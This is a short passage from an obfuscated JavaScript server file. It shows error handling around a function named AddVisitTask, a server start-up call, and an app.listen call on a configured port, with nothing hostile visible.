AddVisitTask();}catch(_0x49b80e){console['error'](_0xea33ce(0x1cb),_0x49b80e);}}startserver()[_0x40226e(0x1ed)](_0x3a767b=>{const _0x4d32c7=_0x40226e;console[_0x4d32c7(0x1de)](_0x4d32c7(0x169),_0x3a767b);}),app[_0x40226e(0x18f)](PORT,()=>console[_0x40226e(0x208)](_0x40226e(0x1d4)+PORT+'!'));
